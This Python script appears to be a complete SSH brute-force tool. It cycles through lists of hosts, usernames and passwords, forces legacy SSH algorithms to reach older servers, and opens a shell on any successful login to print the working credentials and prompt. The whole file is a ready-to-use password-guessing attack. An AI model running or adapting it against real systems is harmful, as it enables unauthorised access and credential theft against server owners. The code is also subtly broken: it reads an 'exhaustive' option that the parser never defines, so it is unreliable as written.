import paramiko
import socket
import argparse
import sys
import signal
from itertools import product
from paramiko import SSHClient, AutoAddPolicy
from collections import defaultdict

# Set legacy algorithms for compatibility
paramiko.transport._preferred_kex = ['diffie-hellman-group14-sha1']
paramiko.transport._preferred_keys = ['ssh-rsa']

# Handle Ctrl+C
def signal_handler(sig, frame):
    print("\n[!] Interrupted by user. Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Argument parser
def parse_args():
    parser = argparse.ArgumentParser(description="SSH brute tester with legacy algorithm support")
    parser.add_argument("--host", required=True, help="Path to file with host IPs")
    parser.add_argument("--user", "-u", required=True, help="Path to file with usernames")
    parser.add_argument("--pwds", "-p", dest="pwd_file", required=True, help="Path to file with passwords")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

# Load a file into a list of stripped non-empty lines
def load_list(path):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[ERROR] Failed to load file '{path}': {e}")
        sys.exit(1)

# Try SSH with given creds
def try_ssh(host, username, password, verbose=False):
    try:
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(
            hostname=host,
            username=username,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=8,
            banner_timeout=8,
            auth_timeout=8
        )

        # Grab interactive prompt after shell login
        shell = client.invoke_shell()
        shell.settimeout(3)
        prompt = ""
        try:
            data = ""
            while True:
                chunk = shell.recv(1024).decode(errors="ignore")
                data += chunk
                if any(p in data for p in ("$", "#", ">")):
                    prompt = data.strip().splitlines()[-1]
                    break
        except Exception:
            prompt = "(could not determine prompt)"

        print("\033[92m[+] Success:\033[0m", f"{username}@{host}:{password}", end="")
        if verbose:
            print(f"  --> Prompt: {prompt}")
        else:
            print()
        client.close()
        return True

    except paramiko.AuthenticationException as e:
        if verbose:
            print(f"[-] Auth failed: {username}@{host}:{password} (Invalid credentials)")
    except paramiko.SSHException as e:
        msg = str(e)
        if verbose:
            if "no matching" in msg.lower() and "kex" in msg.lower():
                print(f"[!] KEX negotiation failed on {host}")
                if "offer:" in msg:
                    offered = msg.split("offer:")[-1].strip()
                    print(f"    └─ Server offered: {offered}")
            elif "host key" in msg.lower():
                print(f"[!] Host key negotiation failed on {host}")
            else:
                print(f"[!] SSHException on {host}: {msg}")
    except socket.timeout:
        if verbose:
            print(f"[!] Timeout on {host}")
    except socket.error as e:
        if verbose:
            print(f"[!] Socket error on {host}: {e}")
    except Exception as e:
        if verbose:
            print(f"[!] Unexpected error on {host}: {e}")
    return False

# Main logic
def main():
    args = parse_args()
    hosts = load_list(args.host)
    users = load_list(args.user)
    pwds = load_list(args.pwd_file)

    if not hosts or not users or not pwds:
        print("[ERROR] One or more input files are empty. Please check them.")
        sys.exit(1)

    print(f"[INFO] Loaded {len(hosts)} hosts, {len(users)} users, {len(pwds)} passwords")

    host_success = set()
    user_success_per_host = set()

    for host in hosts:
        if host in host_success:
            continue  # Already found valid creds for this host

        for username in users:
            if (host, username) in user_success_per_host:
                continue  # Already succeeded for this user@host

            for password in pwds:
                success = try_ssh(host, username, password, verbose=args.verbose)
                if success:
                    user_success_per_host.add((host, username))

                    if not args.exhaustive:
                        host_success.add(host)
                        break  # Exit password loop

            if not args.exhaustive and host in host_success:
                break  # Exit user loop

        if not args.exhaustive and host in host_success:
            continue  # Move on to next host

# Entry point
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        sys.exit(1)
